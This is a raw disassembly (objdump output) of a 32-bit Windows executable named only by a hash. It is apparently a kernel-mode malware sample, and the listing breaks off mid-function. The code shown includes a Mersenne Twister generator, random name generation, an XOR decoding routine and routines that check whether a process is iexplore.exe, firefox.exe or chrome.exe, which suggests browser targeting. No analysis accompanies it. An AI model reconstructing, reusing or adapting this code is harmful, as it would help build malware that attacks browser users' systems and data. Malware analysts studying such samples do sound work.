
b2e2f7113b3543213a130ec0a08bc800de17b2369e63f01285da8c4c43a07839.exe:     file format pei-i386


Disassembly of section .text:

00010600 <.text>:
   10600:	add    BYTE PTR [eax],al
   10602:	add    BYTE PTR [eax],al
   10604:	add    BYTE PTR [eax],al
   10606:	mov    edi,edi
   10608:	push   ebp
   10609:	mov    ebp,esp
   1060b:	mov    eax,DWORD PTR [ebp+0xc]
   1060e:	xor    eax,DWORD PTR [ebp+0x10]
   10611:	mov    ecx,DWORD PTR [ebp+0x10]
   10614:	and    eax,0x7ffffffe
   10619:	xor    eax,DWORD PTR [ebp+0xc]
   1061c:	and    cl,0x1
   1061f:	movzx  ecx,cl
   10622:	shr    eax,1
   10624:	neg    ecx
   10626:	sbb    ecx,ecx
   10628:	and    ecx,0x9908b0df
   1062e:	xor    eax,ecx
   10630:	xor    eax,DWORD PTR [ebp+0x8]
   10633:	pop    ebp
   10634:	ret    0xc
   10637:	int3   
   10638:	int3   
   10639:	int3   
   1063a:	int3   
   1063b:	int3   
   1063c:	mov    edi,edi
   1063e:	push   ebp
   1063f:	mov    ebp,esp
   10641:	sub    esp,0x14
   10644:	mov    DWORD PTR [ebp-0x14],ecx
   10647:	mov    eax,DWORD PTR [ebp-0x14]
   1064a:	mov    DWORD PTR [ebp-0x8],eax
   1064d:	mov    eax,DWORD PTR [ebp-0x14]
   10650:	mov    DWORD PTR [ebp-0x10],eax
   10653:	mov    DWORD PTR [ebp-0x4],0x1
   1065a:	mov    DWORD PTR [ebp-0xc],0x509
   10661:	mov    eax,DWORD PTR [ebp-0x8]
   10664:	mov    ecx,DWORD PTR [ebp+0x8]
   10667:	mov    DWORD PTR [eax],ecx
   10669:	mov    eax,DWORD PTR [ebp-0x8]
   1066c:	add    eax,0x4
   1066f:	mov    DWORD PTR [ebp-0x8],eax
   10672:	jmp    0x1067b
   10674:	mov    eax,DWORD PTR [ebp-0x4]
   10677:	inc    eax
   10678:	mov    DWORD PTR [ebp-0x4],eax
   1067b:	cmp    DWORD PTR [ebp-0x4],0x270
   10682:	jge    0x106b7
   10684:	mov    eax,DWORD PTR [ebp-0x10]
   10687:	mov    eax,DWORD PTR [eax]
   10689:	shr    eax,0x1e
   1068c:	mov    ecx,DWORD PTR [ebp-0x10]
   1068f:	xor    eax,DWORD PTR [ecx]
   10691:	imul   eax,eax,0x15747d
   10697:	imul   eax,DWORD PTR [ebp-0xc]
   1069b:	add    eax,DWORD PTR [ebp-0x4]
   1069e:	mov    ecx,DWORD PTR [ebp-0x8]
   106a1:	mov    DWORD PTR [ecx],eax
   106a3:	mov    eax,DWORD PTR [ebp-0x8]
   106a6:	add    eax,0x4
   106a9:	mov    DWORD PTR [ebp-0x8],eax
   106ac:	mov    eax,DWORD PTR [ebp-0x10]
   106af:	add    eax,0x4
   106b2:	mov    DWORD PTR [ebp-0x10],eax
   106b5:	jmp    0x10674
   106b7:	leave  
   106b8:	ret    0x4
   106bb:	int3   
   106bc:	int3   
   106bd:	int3   
   106be:	int3   
   106bf:	int3   
   106c0:	mov    edi,edi
   106c2:	push   ebp
   106c3:	mov    ebp,esp
   106c5:	push   ecx
   106c6:	push   ebx
   106c7:	push   esi
   106c8:	push   edi
   106c9:	mov    edi,ecx
   106cb:	mov    esi,edi
   106cd:	mov    ebx,0xe3
   106d2:	push   DWORD PTR [esi+0x4]
   106d5:	mov    ecx,edi
   106d7:	push   DWORD PTR [esi]
   106d9:	dec    ebx
   106da:	push   DWORD PTR [esi+0x634]
   106e0:	call   0x10606
   106e5:	mov    DWORD PTR [esi],eax
   106e7:	add    esi,0x4
   106ea:	test   ebx,ebx
   106ec:	jne    0x106d2
   106ee:	mov    DWORD PTR [ebp-0x4],0x18c
   106f5:	lea    ebx,[esi+0x4]
   106f8:	push   DWORD PTR [ebx]
   106fa:	mov    ecx,edi
   106fc:	push   DWORD PTR [esi]
   106fe:	push   DWORD PTR [esi-0x38c]
   10704:	call   0x10606
   10709:	dec    DWORD PTR [ebp-0x4]
   1070c:	mov    DWORD PTR [esi],eax
   1070e:	mov    esi,ebx
   10710:	jne    0x106f5
   10712:	push   DWORD PTR [edi]
   10714:	mov    ecx,edi
   10716:	push   DWORD PTR [esi]
   10718:	push   DWORD PTR [esi-0x38c]
   1071e:	call   0x10606
   10723:	mov    DWORD PTR [esi],eax
   10725:	mov    DWORD PTR [edi+0x9c4],0x270
   1072f:	mov    DWORD PTR [edi+0x9c0],edi
   10735:	pop    edi
   10736:	pop    esi
   10737:	pop    ebx
   10738:	leave  
   10739:	ret    
   1073a:	int3   
   1073b:	int3   
   1073c:	int3   
   1073d:	int3   
   1073e:	int3   
   1073f:	int3   
   10740:	mov    edi,edi
   10742:	push   ebp
   10743:	mov    ebp,esp
   10745:	push   esi
   10746:	push   DWORD PTR [ebp+0x8]
   10749:	mov    esi,ecx
   1074b:	call   0x1063c
   10750:	mov    ecx,esi
   10752:	call   0x106c0
   10757:	pop    esi
   10758:	pop    ebp
   10759:	ret    0x4
   1075c:	int3   
   1075d:	int3   
   1075e:	int3   
   1075f:	int3   
   10760:	int3   
   10761:	int3   
   10762:	mov    edi,edi
   10764:	push   esi
   10765:	push   edi
   10766:	mov    edi,ecx
   10768:	lea    esi,[edi+0x9c4]
   1076e:	cmp    DWORD PTR [esi],0x0
   10771:	jne    0x10778
   10773:	call   0x106c0
   10778:	dec    DWORD PTR [esi]
   1077a:	lea    eax,[edi+0x9c0]
   10780:	mov    edx,DWORD PTR [eax]
   10782:	mov    ecx,DWORD PTR [edx]
   10784:	add    edx,0x4
   10787:	mov    DWORD PTR [eax],edx
   10789:	mov    eax,ecx
   1078b:	shr    eax,0xb
   1078e:	xor    ecx,eax
   10790:	mov    eax,ecx
   10792:	and    eax,0xff3a58ad
   10797:	shl    eax,0x7
   1079a:	xor    ecx,eax
   1079c:	mov    eax,ecx
   1079e:	and    eax,0xffffdf8c
   107a3:	shl    eax,0xf
   107a6:	xor    ecx,eax
   107a8:	mov    eax,ecx
   107aa:	shr    eax,0x12
   107ad:	pop    edi
   107ae:	xor    eax,ecx
   107b0:	pop    esi
   107b1:	ret    
   107b2:	int3   
   107b3:	int3   
   107b4:	int3   
   107b5:	int3   
   107b6:	int3   
   107b7:	int3   
   107b8:	mov    edi,edi
   107ba:	push   ebp
   107bb:	mov    ebp,esp
   107bd:	push   esi
   107be:	mov    esi,DWORD PTR [ebp+0x8]
   107c1:	shr    esi,1
   107c3:	or     esi,DWORD PTR [ebp+0x8]
   107c6:	push   edi
   107c7:	mov    eax,esi
   107c9:	shr    eax,0x2
   107cc:	or     esi,eax
   107ce:	mov    eax,esi
   107d0:	shr    eax,0x4
   107d3:	or     esi,eax
   107d5:	mov    eax,esi
   107d7:	shr    eax,0x8
   107da:	or     esi,eax
   107dc:	mov    eax,esi
   107de:	shr    eax,0x10
   107e1:	mov    edi,ecx
   107e3:	or     esi,eax
   107e5:	mov    ecx,edi
   107e7:	call   0x10762
   107ec:	and    eax,esi
   107ee:	cmp    eax,DWORD PTR [ebp+0x8]
   107f1:	ja     0x107e5
   107f3:	pop    edi
   107f4:	pop    esi
   107f5:	pop    ebp
   107f6:	ret    0x4
   107f9:	int3   
   107fa:	int3   
   107fb:	int3   
   107fc:	int3   
   107fd:	int3   
   107fe:	mov    edi,edi
   10800:	push   ebp
   10801:	mov    ebp,esp
   10803:	sub    esp,0xa04
   10809:	push   ebx
   1080a:	push   esi
   1080b:	mov    esi,DWORD PTR [ebp+0x14]
   1080e:	push   edi
   1080f:	test   esi,esi
   10811:	jne    0x108ec
   10817:	xor    ecx,ecx
   10819:	lea    eax,[ebp-0x3c]
   1081c:	mov    edx,0xff
   10821:	shl    edx,cl
   10823:	and    edx,DWORD PTR [ebp+0x8]
   10826:	shr    edx,cl
   10828:	inc    ecx
   10829:	inc    ecx
   1082a:	mov    DWORD PTR [eax],edx
   1082c:	add    eax,0x4
   1082f:	cmp    ecx,0x14
   10832:	jne    0x1081c
   10834:	mov    ebx,DWORD PTR [ebp+0xc]
   10837:	xor    eax,eax
   10839:	mov    WORD PTR [ebx],ax
   1083c:	mov    eax,DWORD PTR [ebp-0x3c]
   1083f:	push   0x5
   10841:	cdq    
   10842:	pop    ecx
   10843:	idiv   ecx
   10845:	mov    DWORD PTR [ebp-0x14],0x1de56
   1084c:	mov    DWORD PTR [ebp-0x10],0x1de4c
   10853:	mov    DWORD PTR [ebp-0xc],0x1de44
   1085a:	mov    DWORD PTR [ebp-0x8],0x1de3a
   10861:	mov    DWORD PTR [ebp-0x4],0x1de30
   10868:	mov    edx,DWORD PTR [ebp+edx*4-0x14]
   1086c:	mov    ecx,edx
   1086e:	mov    ax,WORD PTR [edx]
   10871:	inc    edx
   10872:	inc    edx
   10873:	test   ax,ax
   10876:	jne    0x1086e
   10878:	sub    edx,ecx
   1087a:	mov    edi,ebx
   1087c:	dec    edi
   1087d:	mov    esi,ecx
   1087f:	dec    edi
   10880:	mov    ax,WORD PTR [edi+0x2]
   10884:	inc    edi
   10885:	inc    edi
   10886:	test   ax,ax
   10889:	jne    0x10880
   1088b:	mov    ecx,edx
   1088d:	shr    ecx,0x2
   10890:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10892:	mov    ecx,edx
   10894:	and    ecx,0x3
   10897:	mov    eax,ebx
   10899:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1089b:	lea    ecx,[eax+0x2]
   1089e:	mov    dx,WORD PTR [eax]
   108a1:	inc    eax
   108a2:	inc    eax
   108a3:	test   dx,dx
   108a6:	jne    0x1089e
   108a8:	sub    eax,ecx
   108aa:	sar    eax,1
   108ac:	mov    ecx,eax
   108ae:	mov    eax,DWORD PTR [ebp-0x38]
   108b1:	push   0x3
   108b3:	cdq    
   108b4:	pop    esi
   108b5:	idiv   esi
   108b7:	cmp    edx,0xfffffffe
   108ba:	jle    0x109a0
   108c0:	add    edx,0x2
   108c3:	lea    esi,[ebp-0x34]
   108c6:	mov    DWORD PTR [ebp+0x8],edx
   108c9:	mov    eax,DWORD PTR [esi]
   108cb:	cdq    
   108cc:	push   0x1a
   108ce:	pop    edi
   108cf:	idiv   edi
   108d1:	add    esi,0x4
   108d4:	xor    eax,eax
   108d6:	add    edx,0x61
   108d9:	mov    WORD PTR [ebx+ecx*2],dx
   108dd:	inc    ecx
   108de:	dec    DWORD PTR [ebp+0x8]
   108e1:	mov    WORD PTR [ebx+ecx*2],ax
   108e5:	jne    0x108c9
   108e7:	jmp    0x109a0
   108ec:	cmp    esi,0x1
   108ef:	je     0x108fc
   108f1:	mov    eax,esi
   108f3:	imul   eax,eax,0xa
   108f6:	add    eax,DWORD PTR [ebp+0x10]
   108f9:	add    DWORD PTR [ebp+0x8],eax
   108fc:	push   DWORD PTR [ebp+0x8]
   108ff:	lea    ecx,[ebp-0xa04]
   10905:	call   0x10740
   1090a:	lea    eax,[esi-0x1]
   1090d:	cmp    eax,0x6
   10910:	ja     0x10921
   10912:	imul   esi,esi,0x3
   10915:	add    esi,DWORD PTR [ebp+0x10]
   10918:	mov    esi,DWORD PTR [esi*4+0x7e4bc]
   1091f:	jmp    0x10926
   10921:	mov    esi,0x1de2e
   10926:	mov    ebx,DWORD PTR [ebp+0xc]
   10929:	xor    eax,eax
   1092b:	mov    WORD PTR [ebx],ax
   1092e:	mov    eax,esi
   10930:	mov    edx,esi
   10932:	mov    cx,WORD PTR [eax]
   10935:	inc    eax
   10936:	inc    eax
   10937:	test   cx,cx
   1093a:	jne    0x10932
   1093c:	sub    eax,edx
   1093e:	mov    edi,ebx
   10940:	dec    edi
   10941:	dec    edi
   10942:	mov    cx,WORD PTR [edi+0x2]
   10946:	inc    edi
   10947:	inc    edi
   10948:	test   cx,cx
   1094b:	jne    0x10942
   1094d:	mov    ecx,eax
   1094f:	shr    ecx,0x2
   10952:	mov    esi,edx
   10954:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10956:	mov    ecx,eax
   10958:	and    ecx,0x3
   1095b:	mov    eax,ebx
   1095d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1095f:	lea    ecx,[eax+0x2]
   10962:	mov    dx,WORD PTR [eax]
   10965:	inc    eax
   10966:	inc    eax
   10967:	test   dx,dx
   1096a:	jne    0x10962
   1096c:	sub    eax,ecx
   1096e:	sar    eax,1
   10970:	push   0x5
   10972:	mov    esi,eax
   10974:	pop    edi
   10975:	push   0x23
   10977:	lea    ecx,[ebp-0xa04]
   1097d:	call   0x107b8
   10982:	cmp    eax,0xa
   10985:	jae    0x1098c
   10987:	add    eax,0x30
   1098a:	jmp    0x1098f
   1098c:	add    eax,0x57
   1098f:	movzx  eax,ax
   10992:	mov    WORD PTR [ebx+esi*2],ax
   10996:	inc    esi
   10997:	xor    eax,eax
   10999:	dec    edi
   1099a:	mov    WORD PTR [ebx+esi*2],ax
   1099e:	jne    0x10975
   109a0:	pop    edi
   109a1:	pop    esi
   109a2:	pop    ebx
   109a3:	leave  
   109a4:	ret    0x10
   109a7:	int3   
   109a8:	int3   
   109a9:	int3   
   109aa:	int3   
   109ab:	int3   
   109ac:	mov    edi,edi
   109ae:	push   ebp
   109af:	mov    ebp,esp
   109b1:	mov    eax,DWORD PTR [ebp+0x8]
   109b4:	lea    edx,[eax+0x2]
   109b7:	mov    cx,WORD PTR [eax]
   109ba:	inc    eax
   109bb:	inc    eax
   109bc:	test   cx,cx
   109bf:	jne    0x109b7
   109c1:	sub    eax,edx
   109c3:	sar    eax,1
   109c5:	pop    ebp
   109c6:	ret    0x4
   109c9:	int3   
   109ca:	int3   
   109cb:	int3   
   109cc:	int3   
   109cd:	int3   
   109ce:	mov    eax,ecx
   109d0:	ret    
   109d1:	int3   
   109d2:	int3   
   109d3:	int3   
   109d4:	int3   
   109d5:	int3   
   109d6:	ret    
   109d7:	int3   
   109d8:	int3   
   109d9:	int3   
   109da:	int3   
   109db:	int3   
   109dc:	mov    edi,edi
   109de:	push   ebp
   109df:	mov    ebp,esp
   109e1:	push   esi
   109e2:	mov    esi,DWORD PTR [ebp+0x8]
   109e5:	push   edi
   109e6:	mov    edi,DWORD PTR [ebp+0xc]
   109e9:	jmp    0x10a39
   109eb:	push   0x0
   109ed:	push   0x100
   109f2:	push   edi
   109f3:	push   esi
   109f4:	call   0x1da6e
   109f9:	lea    eax,[eax*8+0x7f0b8]
   10a00:	add    DWORD PTR [eax],esi
   10a02:	adc    DWORD PTR [eax+0x4],edi
   10a05:	test   edi,edi
   10a07:	jl     0x10a42
   10a09:	jg     0x10a0f
   10a0b:	test   esi,esi
   10a0d:	jbe    0x10a42
   10a0f:	mov    eax,esi
   10a11:	xor    ecx,ecx
   10a13:	and    eax,0x1
   10a16:	or     eax,ecx
   10a18:	push   ecx
   10a19:	jne    0x10a26
   10a1b:	push   0x2
   10a1d:	push   edi
   10a1e:	push   esi
   10a1f:	call   0x1da62
   10a24:	jmp    0x10a35
   10a26:	push   0x3
   10a28:	push   edi
   10a29:	push   esi
   10a2a:	call   0x1da56
   10a2f:	add    eax,0x1
   10a32:	adc    edx,0x0
   10a35:	mov    edi,edx
   10a37:	mov    esi,eax
   10a39:	cmp    esi,0x4
   10a3c:	jne    0x109eb
   10a3e:	test   edi,edi
   10a40:	jne    0x109eb
   10a42:	mov    edx,edi
   10a44:	pop    edi
   10a45:	mov    eax,esi
   10a47:	pop    esi
   10a48:	pop    ebp
   10a49:	ret    0x8
   10a4c:	int3   
   10a4d:	int3   
   10a4e:	int3   
   10a4f:	int3   
   10a50:	int3   
   10a51:	int3   
   10a52:	mov    edi,edi
   10a54:	push   ebp
   10a55:	mov    ebp,esp
   10a57:	push   esi
   10a58:	push   0x20
   10a5a:	push   0x61737973
   10a5f:	push   DWORD PTR [ebp+0x8]
   10a62:	push   0x1
   10a64:	call   DWORD PTR ds:0x1ee18
   10a6a:	mov    esi,eax
   10a6c:	test   esi,esi
   10a6e:	jne    0x10a7b
   10a70:	push   0xc000009a
   10a75:	call   DWORD PTR ds:0x1ee14
   10a7b:	mov    eax,esi
   10a7d:	pop    esi
   10a7e:	pop    ebp
   10a7f:	ret    
   10a80:	int3   
   10a81:	int3   
   10a82:	int3   
   10a83:	int3   
   10a84:	int3   
   10a85:	int3   
   10a86:	mov    edi,edi
   10a88:	push   esi
   10a89:	mov    esi,ecx
   10a8b:	dec    DWORD PTR [esi+0x4]
   10a8e:	jne    0x10a9f
   10a90:	push   DWORD PTR [esi]
   10a92:	call   0x1d9f8
   10a97:	push   esi
   10a98:	call   0x1d9f8
   10a9d:	pop    ecx
   10a9e:	pop    ecx
   10a9f:	pop    esi
   10aa0:	ret    
   10aa1:	int3   
   10aa2:	int3   
   10aa3:	int3   
   10aa4:	int3   
   10aa5:	int3   
   10aa6:	mov    edi,edi
   10aa8:	push   ebp
   10aa9:	mov    ebp,esp
   10aab:	push   esi
   10aac:	xor    esi,esi
   10aae:	xor    edx,edx
   10ab0:	cmp    DWORD PTR [ebp+0xc],esi
   10ab3:	je     0x10ad0
   10ab5:	mov    eax,DWORD PTR [ebp+0x8]
   10ab8:	mov    ecx,DWORD PTR [ebp+0x10]
   10abb:	mov    cl,BYTE PTR [edx+ecx*1]
   10abe:	add    eax,esi
   10ac0:	xor    BYTE PTR [eax],cl
   10ac2:	lea    eax,[edx+0x1]
   10ac5:	xor    edx,edx
   10ac7:	div    DWORD PTR [ebp+0x14]
   10aca:	inc    esi
   10acb:	cmp    esi,DWORD PTR [ebp+0xc]
   10ace:	jne    0x10ab5
   10ad0:	pop    esi
   10ad1:	pop    ebp
   10ad2:	ret    0x10
   10ad5:	int3   
   10ad6:	int3   
   10ad7:	int3   
   10ad8:	int3   
   10ad9:	int3   
   10ada:	mov    edi,edi
   10adc:	push   ebp
   10add:	mov    ebp,esp
   10adf:	mov    ecx,DWORD PTR [ebp+0x8]
   10ae2:	mov    eax,ecx
   10ae4:	lea    edx,[eax+0x2]
   10ae7:	push   esi
   10ae8:	mov    si,WORD PTR [eax]
   10aeb:	inc    eax
   10aec:	inc    eax
   10aed:	test   si,si
   10af0:	jne    0x10ae8
   10af2:	sub    eax,edx
   10af4:	sar    eax,1
   10af6:	cmp    eax,0xc
   10af9:	jae    0x10b02
   10afb:	xor    al,al
   10afd:	jmp    0x10bd0
   10b02:	lea    eax,[ecx+eax*2-0x18]
   10b06:	movzx  ecx,WORD PTR [eax]
   10b09:	cmp    cx,0x69
   10b0d:	je     0x10b15
   10b0f:	cmp    cx,0x49
   10b13:	jne    0x10afb
   10b15:	movzx  ecx,WORD PTR [eax+0x2]
   10b19:	push   0x45
   10b1b:	pop    esi
   10b1c:	push   0x65
   10b1e:	pop    edx
   10b1f:	cmp    cx,dx
   10b22:	je     0x10b29
   10b24:	cmp    cx,si
   10b27:	jne    0x10afb
   10b29:	movzx  ecx,WORD PTR [eax+0x4]
   10b2d:	cmp    cx,0x78
   10b31:	je     0x10b39
   10b33:	cmp    cx,0x58
   10b37:	jne    0x10afb
   10b39:	movzx  ecx,WORD PTR [eax+0x6]
   10b3d:	cmp    cx,0x70
   10b41:	je     0x10b49
   10b43:	cmp    cx,0x50
   10b47:	jne    0x10afb
   10b49:	movzx  ecx,WORD PTR [eax+0x8]
   10b4d:	cmp    cx,0x6c
   10b51:	je     0x10b59
   10b53:	cmp    cx,0x4c
   10b57:	jne    0x10afb
   10b59:	movzx  ecx,WORD PTR [eax+0xa]
   10b5d:	cmp    cx,0x6f
   10b61:	je     0x10b69
   10b63:	cmp    cx,0x4f
   10b67:	jne    0x10afb
   10b69:	movzx  ecx,WORD PTR [eax+0xc]
   10b6d:	cmp    cx,0x52
   10b71:	je     0x10b79
   10b73:	cmp    cx,0x72
   10b77:	jne    0x10afb
   10b79:	movzx  ecx,WORD PTR [eax+0xe]
   10b7d:	cmp    cx,dx
   10b80:	je     0x10b8b
   10b82:	cmp    cx,si
   10b85:	jne    0x10afb
   10b8b:	cmp    WORD PTR [eax+0x10],0x2e
   10b90:	jne    0x10afb
   10b96:	movzx  ecx,WORD PTR [eax+0x12]
   10b9a:	cmp    cx,dx
   10b9d:	je     0x10ba8
   10b9f:	cmp    cx,si
   10ba2:	jne    0x10afb
   10ba8:	movzx  ecx,WORD PTR [eax+0x14]
   10bac:	cmp    cx,0x78
   10bb0:	je     0x10bbc
   10bb2:	cmp    cx,0x58
   10bb6:	jne    0x10afb
   10bbc:	movzx  eax,WORD PTR [eax+0x16]
   10bc0:	cmp    ax,dx
   10bc3:	je     0x10bce
   10bc5:	cmp    ax,si
   10bc8:	jne    0x10afb
   10bce:	mov    al,0x1
   10bd0:	pop    esi
   10bd1:	pop    ebp
   10bd2:	ret    0x4
   10bd5:	int3   
   10bd6:	int3   
   10bd7:	int3   
   10bd8:	int3   
   10bd9:	int3   
   10bda:	mov    edi,edi
   10bdc:	push   ebp
   10bdd:	mov    ebp,esp
   10bdf:	mov    ecx,DWORD PTR [ebp+0x8]
   10be2:	mov    eax,ecx
   10be4:	lea    edx,[eax+0x2]
   10be7:	push   esi
   10be8:	mov    si,WORD PTR [eax]
   10beb:	inc    eax
   10bec:	inc    eax
   10bed:	test   si,si
   10bf0:	jne    0x10be8
   10bf2:	sub    eax,edx
   10bf4:	sar    eax,1
   10bf6:	pop    esi
   10bf7:	cmp    eax,0xb
   10bfa:	jae    0x10c03
   10bfc:	xor    al,al
   10bfe:	jmp    0x10cbf
   10c03:	lea    eax,[ecx+eax*2-0x16]
   10c07:	movzx  ecx,WORD PTR [eax]
   10c0a:	cmp    cx,0x66
   10c0e:	je     0x10c16
   10c10:	cmp    cx,0x46
   10c14:	jne    0x10bfc
   10c16:	movzx  ecx,WORD PTR [eax+0x2]
   10c1a:	cmp    cx,0x69
   10c1e:	je     0x10c26
   10c20:	cmp    cx,0x49
   10c24:	jne    0x10bfc
   10c26:	movzx  ecx,WORD PTR [eax+0x4]
   10c2a:	cmp    cx,0x72
   10c2e:	je     0x10c36
   10c30:	cmp    cx,0x52
   10c34:	jne    0x10bfc
   10c36:	movzx  ecx,WORD PTR [eax+0x6]
   10c3a:	cmp    cx,0x65
   10c3e:	je     0x10c46
   10c40:	cmp    cx,0x45
   10c44:	jne    0x10bfc
   10c46:	movzx  ecx,WORD PTR [eax+0x8]
   10c4a:	cmp    cx,0x66
   10c4e:	je     0x10c56
   10c50:	cmp    cx,0x46
   10c54:	jne    0x10bfc
   10c56:	movzx  ecx,WORD PTR [eax+0xa]
   10c5a:	cmp    cx,0x6f
   10c5e:	je     0x10c66
   10c60:	cmp    cx,0x4f
   10c64:	jne    0x10bfc
   10c66:	movzx  ecx,WORD PTR [eax+0xc]
   10c6a:	cmp    cx,0x58
   10c6e:	je     0x10c76
   10c70:	cmp    cx,0x78
   10c74:	jne    0x10bfc
   10c76:	cmp    WORD PTR [eax+0xe],0x2e
   10c7b:	jne    0x10bfc
   10c81:	movzx  ecx,WORD PTR [eax+0x10]
   10c85:	cmp    cx,0x65
   10c89:	je     0x10c95
   10c8b:	cmp    cx,0x45
   10c8f:	jne    0x10bfc
   10c95:	movzx  ecx,WORD PTR [eax+0x12]
   10c99:	cmp    cx,0x78
   10c9d:	je     0x10ca9
   10c9f:	cmp    cx,0x58
   10ca3:	jne    0x10bfc
   10ca9:	movzx  eax,WORD PTR [eax+0x14]
   10cad:	cmp    ax,0x65
   10cb1:	je     0x10cbd
   10cb3:	cmp    ax,0x45
   10cb7:	jne    0x10bfc
   10cbd:	mov    al,0x1
   10cbf:	pop    ebp
   10cc0:	ret    0x4
   10cc3:	int3   
   10cc4:	int3   
   10cc5:	int3   
   10cc6:	int3   
   10cc7:	int3   
   10cc8:	mov    edi,edi
   10cca:	push   ebp
   10ccb:	mov    ebp,esp
   10ccd:	mov    ecx,DWORD PTR [ebp+0x8]
   10cd0:	mov    eax,ecx
   10cd2:	lea    edx,[eax+0x2]
   10cd5:	push   esi
   10cd6:	mov    si,WORD PTR [eax]
   10cd9:	inc    eax
   10cda:	inc    eax
   10cdb:	test   si,si
   10cde:	jne    0x10cd6
   10ce0:	sub    eax,edx
   10ce2:	sar    eax,1
   10ce4:	pop    esi
   10ce5:	cmp    eax,0xa
   10ce8:	jae    0x10cf1
   10cea:	xor    al,al
   10cec:	jmp    0x10d99
   10cf1:	lea    eax,[ecx+eax*2-0x14]
   10cf5:	movzx  ecx,WORD PTR [eax]
   10cf8:	cmp    cx,0x63
   10cfc:	je     0x10d04
   10cfe:	cmp    cx,0x43
   10d02:	jne    0x10cea
   10d04:	movzx  ecx,WORD PTR [eax+0x2]
   10d08:	cmp    cx,0x68
   10d0c:	je     0x10d14
   10d0e:	cmp    cx,0x48
   10d12:	jne    0x10cea
   10d14:	movzx  ecx,WORD PTR [eax+0x4]
   10d18:	cmp    cx,0x72
   10d1c:	je     0x10d24
   10d1e:	cmp    cx,0x52
   10d22:	jne    0x10cea
   10d24:	movzx  ecx,WORD PTR [eax+0x6]
   10d28:	cmp    cx,0x6f
   10d2c:	je     0x10d34
   10d2e:	cmp    cx,0x4f
   10d32:	jne    0x10cea
   10d34:	movzx  ecx,WORD PTR [eax+0x8]
   10d38:	cmp    cx,0x6d
   10d3c:	je     0x10d44
   10d3e:	cmp    cx,0x4d
   10d42:	jne    0x10cea
   10d44:	movzx  ecx,WORD PTR [eax+0xa]
   10d48:	cmp    cx,0x65
   10d4c:	je     0x10d54
   10d4e:	cmp    cx,0x45
   10d52:	jne    0x10cea
   10d54:	cmp    WORD PTR [eax+0xc],0x2e
   10d59:	jne    0x10cea
   10d5b:	movzx  ecx,WORD PTR [eax+0xe]
   10d5f:	cmp    cx,0x65
   10d63:	je     0x10d6f
   10d65:	cmp    cx,0x45
   10d69:	jne    0x10cea
   10d6f:	movzx  ecx,WORD PTR [eax+0x10]
   10d73:	cmp    cx,0x78
   10d77:	je     0x10d83
   10d79:	cmp    cx,0x58
   10d7d:	jne    0x10cea
   10d83:	movzx  eax,WORD PTR [eax+0x12]
   10d87:	cmp    ax,0x65
   10d8b:	je     0x10d97
   10d8d:	cmp    ax,0x45
   10d91:	jne    0x10cea
   10d97:	mov    al,0x1
   10d99:	pop    ebp
   10d9a:	ret    0x4
   10d9d:	int3   
   10d9e:	int3   
   10d9f:	int3   
   10da0:	int3   
   10da1:	int3   
   10da2:	mov    edi,edi
   10da4:	push   ebp
   10da5:	mov    ebp,esp
   10da7:	push   DWORD PTR [ebp+0x8]
   10daa:	call   0x10ada
   10daf:	test   al,al
   10db1:	je     0x10db8
   10db3:	xor    eax,eax
   10db5:	inc    eax
   10db6:	jmp    0x10ddb
   10db8:	push   DWORD PTR [ebp+0x8]
   10dbb:	call   0x10bda
   10dc0:	test   al,al
   10dc2:	je     0x10dc9
   10dc4:	push   0x2
   10dc6:	pop    eax
   10dc7:	jmp    0x10ddb
   10dc9:	push   DWORD PTR [ebp+0x8]
   10dcc:	call   0x10cc8
   10dd1:	movzx  eax,al
   10dd4:	neg    eax
   10dd6:	sbb    eax,eax
   10dd8:	and    eax,0x3
   10ddb:	pop    ebp
   10ddc:	ret    0x4
   10ddf:	int3   
   10de0:	int3   
   10de1:	int3   
   10de2:	int3   
   10de3:	int3   
   10de4:	mov    edi,edi
   10de6:	push   ebp
   10de7:	mov    ebp,esp
   10de9:	sub    esp,0x10
   10dec:	push   esi
   10ded:	push   edi
   10dee:	xor    eax,eax
   10df0:	mov    WORD PTR [ebp-0x8],ax
   10df4:	lea    edi,[ebp-0x6]
   10df7:	stos   DWORD PTR es:[edi],eax
   10df8:	stos   WORD PTR es:[edi],ax
   10dfa:	mov    eax,DWORD PTR [ebp+0xc]
   10dfd:	mov    DWORD PTR [ebp-0x4],eax
   10e00:	lea    ecx,[eax+0x2]
   10e03:	mov    dx,WORD PTR [eax]
   10e06:	inc    eax
   10e07:	inc    eax
   10e08:	test   dx,dx
   10e0b:	jne    0x10e03
   10e0d:	mov    esi,DWORD PTR [ebp+0x8]
   10e10:	movzx  edx,WORD PTR [esi]
   10e13:	sub    eax,ecx
   10e15:	sar    eax,1
   10e17:	lea    ecx,[eax+eax*1]
   10e1a:	mov    WORD PTR [ebp-0x8],cx
   10e1e:	mov    WORD PTR [ebp-0x6],cx
   10e22:	cmp    dx,cx
   10e25:	jb     0x10e64
   10e27:	xor    eax,eax
   10e29:	lea    edi,[ebp-0xe]
   10e2c:	stos   DWORD PTR es:[edi],eax
   10e2d:	stos   WORD PTR es:[edi],ax
   10e2f:	mov    WORD PTR [ebp-0x10],cx
   10e33:	mov    WORD PTR [ebp-0xe],cx
   10e37:	movzx  eax,dx
   10e3a:	movzx  ecx,cx
   10e3d:	sub    eax,ecx
   10e3f:	mov    ecx,DWORD PTR [esi+0x4]
   10e42:	cdq    
   10e43:	sub    eax,edx
   10e45:	sar    eax,1
   10e47:	lea    eax,[ecx+eax*2]
   10e4a:	mov    DWORD PTR [ebp-0xc],eax
   10e4d:	push   0x1
   10e4f:	lea    eax,[ebp-0x8]
   10e52:	push   eax
   10e53:	lea    eax,[ebp-0x10]
   10e56:	push   eax
   10e57:	call   DWORD PTR ds:0x1ee20
   10e5d:	neg    eax
   10e5f:	sbb    eax,eax
   10e61:	inc    eax
   10e62:	jmp    0x10e66
   10e64:	xor    al,al
   10e66:	pop    edi
   10e67:	pop    esi
   10e68:	leave  
   10e69:	ret    0x8
   10e6c:	int3   
   10e6d:	int3   
   10e6e:	int3   
   10e6f:	int3   
   10e70:	int3   
   10e71:	int3   
   10e72:	mov    edi,edi
   10e74:	push   ebp
   10e75:	mov    ebp,esp
   10e77:	push   ebx
   10e78:	xor    eax,eax
   10e7a:	push   eax
   10e7b:	push   eax
   10e7c:	push   eax
   10e7d:	push   eax
   10e7e:	mov    ebx,0x7e534
   10e83:	push   ebx
